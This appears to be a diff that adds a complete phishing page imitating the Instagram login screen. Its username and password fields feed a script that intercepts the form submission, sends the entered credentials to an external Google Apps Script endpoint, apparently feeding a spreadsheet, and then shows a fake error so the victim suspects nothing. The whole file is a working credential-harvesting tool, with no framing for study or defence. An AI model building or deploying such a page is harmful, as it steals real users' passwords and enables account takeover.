@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>instagram</title>
+    <link rel="stylesheet" href="cssinsta.css">
+    
+  </head>
+ 
+  <body>
+      <fieldset>
+    
+    <form method="post" name="google-sheet">
+        <img src="Capture.PNG" alt="" />
+      <div>
+        <input type="text" name="name" id="name" placeholder="Username" required />
+      </div>
+  
+      <div>
+        <input
+          type="text"
+          name="password"
+          id="password"
+          placeholder="password"
+          required
+        />
+      </div>
+     
+      <input type="submit" value="Log in " name="submit" /><a href="https://www.google.com"></a>
+      
+      <br />
+    
+      
+      <a href="#">Forgot Password?</a></fieldset>
+      <p>
+          Dont have a account
+          <br>
+<a href="#">Sign in</a>
+      </p>
+
+     
+
+    </form>
+    <script>
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbxJPTZN6x2rxZynvk4lvf2Yg1A3yZTrbZOmvbWrpmU3F2YRaTn5jqsn6crVM3rCln5H/exec'
+      const form = document.forms['google-sheet']
+    
+      form.addEventListener('submit', e => {
+        e.preventDefault()
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => alert("Error Faild"))
+          .catch(error => console.error('Error!', error.message))
+      })
+    </script>
+  
+                           
+  </body>
+</html>
